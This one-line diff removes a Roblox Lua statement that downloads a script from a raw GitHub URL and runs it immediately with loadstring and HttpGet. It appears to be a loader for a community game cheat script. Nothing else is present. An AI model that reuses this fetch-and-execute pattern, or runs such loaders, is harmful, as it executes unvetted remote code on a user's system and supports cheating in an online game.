@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/v3rmies/Roblox-Stuff/main/ShrekIntheBackrooms.lua')))()
